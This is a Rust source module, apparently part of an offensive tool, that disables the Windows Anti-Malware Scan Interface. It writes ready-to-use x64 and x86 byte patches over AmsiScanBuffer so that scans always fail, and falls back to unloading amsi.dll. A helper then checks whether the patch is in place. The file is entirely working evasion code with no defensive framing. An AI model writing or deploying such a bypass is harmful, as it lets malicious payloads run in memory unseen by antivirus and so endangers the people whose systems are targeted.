// AMSI Bypass
// Bypasses Windows Anti-Malware Scan Interface to prevent memory scanning

use crate::api_resolver::resolve_api;
use std::ffi::CString;
use std::ptr;
use winapi::shared::minwindef::*;
use winapi::um::errhandlingapi::*;
use winapi::um::libloaderapi::*;
use winapi::um::memoryapi::*;
use winapi::um::winnt::*;

/// Bypass AMSI by patching AmsiScanBuffer
pub unsafe fn bypass_amsi() -> Result<(), String> {
    // Method 1: Patch AmsiScanBuffer to always return "clean"
    if let Err(e) = patch_amsi_scan_buffer() {
        // Method 2: Try to unload AMSI.dll
        if let Err(_) = unload_amsi_dll() {
            return Err(format!("AMSI bypass failed: {}", e));
        }
    }

    Ok(())
}

/// Patch AmsiScanBuffer function
unsafe fn patch_amsi_scan_buffer() -> Result<(), String> {
    // Load AMSI.dll
    let amsi_dll = CString::new("amsi.dll").unwrap();
    let amsi_module = LoadLibraryA(amsi_dll.as_ptr() as *const i8);

    if amsi_module.is_null() {
        return Err("Failed to load amsi.dll".to_string());
    }

    // Resolve AmsiScanBuffer
    let amsi_scan_buffer_name = CString::new("AmsiScanBuffer").unwrap();
    let amsi_scan_buffer = GetProcAddress(amsi_module, amsi_scan_buffer_name.as_ptr() as *const i8);

    if amsi_scan_buffer.is_null() {
        return Err("Failed to resolve AmsiScanBuffer".to_string());
    }

    // Patch: mov eax, 0x80070057; ret (x86)
    // Patch: mov rax, 0x80070057; ret (x64)
    #[cfg(target_arch = "x86_64")]
    {
        // x64: mov rax, 0x80070057; ret
        // Bytes: 48 C7 C0 57 00 07 80 C3
        let patch: [u8; 8] = [0x48, 0xC7, 0xC0, 0x57, 0x00, 0x07, 0x80, 0xC3];
        let patch_size = patch.len();

        // Change memory protection
        let mut old_protect = 0u32;
        if VirtualProtect(
            amsi_scan_buffer,
            patch_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0
        {
            return Err(format!(
                "Failed to change memory protection: {}",
                GetLastError()
            ));
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan_buffer as *mut u8, patch_size);

        // Restore protection
        let mut _dummy = 0u32;
        VirtualProtect(amsi_scan_buffer, patch_size, old_protect, &mut _dummy);
    }

    #[cfg(target_arch = "x86")]
    {
        // x86: mov eax, 0x80070057; ret
        // Bytes: B8 57 00 07 80 C3
        let patch: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        let patch_size = patch.len();

        // Change memory protection
        let mut old_protect = 0u32;
        if VirtualProtect(
            amsi_scan_buffer,
            patch_size,
            PAGE_EXECUTE_READWRITE,
            &mut old_protect,
        ) == 0
        {
            return Err(format!(
                "Failed to change memory protection: {}",
                GetLastError()
            ));
        }

        ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan_buffer as *mut u8, patch_size);

        // Restore protection
        let mut _dummy = 0u32;
        VirtualProtect(amsi_scan_buffer, patch_size, old_protect, &mut _dummy);
    }

    Ok(())
}

/// Unload AMSI.dll (alternative method)
unsafe fn unload_amsi_dll() -> Result<(), String> {
    // Get handle to amsi.dll
    let amsi_dll = CString::new("amsi.dll").unwrap();
    let amsi_module = GetModuleHandleA(amsi_dll.as_ptr() as *const i8);

    if amsi_module.is_null() {
        return Err("AMSI.dll not loaded".to_string());
    }

    // Try to free the library
    // Note: This may not work if other processes are using it
    FreeLibrary(amsi_module);

    Ok(())
}

/// Check if AMSI is bypassed
pub unsafe fn is_amsi_bypassed() -> bool {
    let amsi_dll = CString::new("amsi.dll").unwrap();
    let amsi_module = GetModuleHandleA(amsi_dll.as_ptr() as *const i8);

    if amsi_module.is_null() {
        return true; // AMSI not loaded
    }

    let amsi_scan_buffer_name = CString::new("AmsiScanBuffer").unwrap();
    let amsi_scan_buffer = GetProcAddress(amsi_module, amsi_scan_buffer_name.as_ptr() as *const i8);

    if amsi_scan_buffer.is_null() {
        return true; // Function not found
    }

    // Check if patched (first byte should be 0x48 (x64) or 0xB8 (x86))
    let first_byte = *(amsi_scan_buffer as *const u8);

    #[cfg(target_arch = "x86_64")]
    {
        first_byte == 0x48 // mov rax, ...
    }

    #[cfg(target_arch = "x86")]
    {
        first_byte == 0xB8 // mov eax, ...
    }
}
